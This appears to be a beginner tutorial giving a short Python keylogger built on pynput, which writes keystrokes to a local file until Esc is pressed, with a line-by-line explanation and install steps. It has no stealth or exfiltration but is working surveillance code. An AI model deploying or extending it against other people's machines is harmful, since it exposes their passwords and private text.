        ____KEYLOGGER___


=============
Instructions:
=============

Create a basic keylogger program that records and logs keystrokes. Focus on logging the keys pressed and saving them to a file. Note: Ethical considerations and permissions are crucial for projects involving keyloggers.

=============
Python Script:
=============


from pynput import keyboard

# File to save the logs
log_file = "key_log.txt"

# List to store keystrokes
keys = []

# Function to write keystrokes to the log file
def write_to_file(keys):
    with open(log_file, "a") as f:
        for key in keys:
            
            # Format the key and write it to the file
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k)

# Callback function for when a key is pressed
def on_press(key):
    keys.append(key)
    write_to_file(keys)
    keys.clear()

# Callback function for when a key is released
def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Start the keylogger
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()



=============
Explanation:
=============

Imports:
- ‘from pynput import keyboard’: Imports the necessary modules from the pynput library to handle keyboard events.

Log File:
- ‘log_file = "key_log.txt”’: Specifies the file where keystrokes will be saved.

Key Storage:
'keys = []:’ Initializes a list to store keystrokes temporarily.

Write to File:
- ‘write_to_file(keys): Function to write the captured keystrokes to the log file. It formats the keystrokes and handles special cases (like spaces).

Key Press Callback:
- on_press(key): Function called whenever a key is pressed. It appends the key to the list and writes it to the file.

Key Release Callback:
- on_release(key): Function called whenever a key is released. It stops the listener if the Esc key is pressed.

Start the Listener:
- with keyboard.Listener(on_press=on_press, on_release=on_release) as listener: Starts the keyboard listener to capture keystrokes.

1. To install Pynput on terminal initiate --- “pip install pynput”

2. Run the program.
